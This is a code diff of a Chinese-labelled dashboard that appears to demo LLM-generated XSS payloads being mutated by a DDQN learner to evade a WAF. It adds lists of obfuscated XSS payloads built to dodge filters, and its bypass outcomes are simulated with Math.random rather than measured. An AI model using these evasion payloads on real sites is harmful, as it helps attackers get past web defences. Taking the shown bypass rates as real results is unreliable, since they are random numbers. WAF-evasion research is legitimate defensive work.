@@ -1369,7 +1369,7 @@ crs所觸發的id:{rule_ids}
             <div class="flow-step" id="step-llm"><strong>LLM Generated Payload</strong><span>原始 payload 通常會被 WAF 與 Decoder+WAF 偵測。</span></div>
             <div class="flow-step" id="step-browser"><strong>Browser Verification</strong><span>驗證 payload 是否仍具備真實攻擊能力。</span></div>
             <div class="flow-step" id="step-ddqn"><strong>DDQN Reinforcement</strong><span>DDQN 根據 WAF 回饋持續學習並強化 payload 繞過能力。</span></div>
-            <div class="flow-step" id="step-browser"><strong>Browser Verification</strong><span>驗證 payload 是否仍具備真實攻擊能力。</span></div>
+            <div class="flow-step" id="step-browser-ddqn"><strong>Browser Verification</strong><span>DDQN 變異後再次驗證 payload 是否仍具備真實攻擊能力。</span></div>
           </div>
 
           <div class="payload-view">
@@ -1470,13 +1470,15 @@ crs所觸發的id:{rule_ids}
   <script>
     const fallbackLlmPayloads = [
       '"<img src=x onerror=alert(1)>"',
-      '"<svg onload=alert(1)>"',
-      '"<details open ontoggle=alert(1)>"'
+      '"<img/src/onerror=/*%RND%*/alert(1)>"',
+      '"<img/src=x/onerror=Function`alert(1)`>"',
+      '"<iMg/sRc=x onError=confirm(1)>"'
     ];
     const fallbackDdqnPayloads = [
-      '"<img src=x one%09rror=ale%09rt(\'XSS\')>"',
-      '"<img/src=x/onerror=setTimeout(\'al\'+\'ert(1)\',0)>"',
-      '"<svg/onload=/%2A%25RND%25%2A/alert(1)>"'
+      '"<img/src=x/one/*x*/rror=\'/*\n*/al/*x*/ert(1)\'>"',
+      '"<img/src=x/one/*x*/rror=setTimeout(\'al\'+\'ert(1)\',0)>',
+      '"<img//src=x//onerror=\'Function`alert(1)`\'>"',
+      '"<Img//sRc=x//onErRoR="(funCTiOn(){ConFIrm(1)})();">"'
     ];
 
     const state = { llmPayloads: fallbackLlmPayloads, ddqnPayloads: fallbackDdqnPayloads, llmIndex: 0, currentPayload: '', stage: 'idle', total: 0, browser: 0, wafBypass: 0, decoderBypass: 0 };
@@ -1506,7 +1508,7 @@ crs所觸發的id:{rule_ids}
 
     function setClock() { $('#utc-time').textContent = nowUTC(); }
     function setStep(id, mode) { const el = $(id); el.className = `flow-step ${mode || ''}`.trim(); }
-    function resetSteps() { ['#step-prompt','#step-llm','#step-browser','#step-ddqn'].forEach((id, i) => setStep(id, i === 0 ? 'active' : '')); }
+    function resetSteps() { ['#step-prompt','#step-llm','#step-browser','#step-ddqn','#step-browser-ddqn'].forEach((id, i) => setStep(id, i === 0 ? 'active' : '')); }
     function showPayload(title, source, payload) { $('#payload-title').textContent = title; $('#payload-source').textContent = source; $('#payload-preview').textContent = payload; }
 
     function addGenerationLog(result, name, ms = '--') {
@@ -1646,7 +1648,9 @@ crs所觸發的id:{rule_ids}
       const wafBypass = Math.random() < 0.75;
       // WAF+Decoder 更嚴格：必須先通過 Normal WAF，才有可能通過 Decoder+WAF。
       const decoderBypass = wafBypass && Math.random() < (0.25 / 0.75);
-      setStep('#step-browser', 'pass'); setStep('#step-ddqn', wafBypass || decoderBypass ? 'bypass' : 'fail');
+      setStep('#step-browser', 'pass');
+      setStep('#step-ddqn', wafBypass || decoderBypass ? 'bypass' : 'fail');
+      setStep('#step-browser-ddqn', 'pass');
       showPayload('DDQN Mutated Payload', `ddqn.txt #${idx + 1} 對應 LLM #${state.llmIndex + 1}`, state.currentPayload);
       verifyBrowser('DDQN Mutated Payload');
       setDefense('DDQN 再變異', wafBypass, decoderBypass);
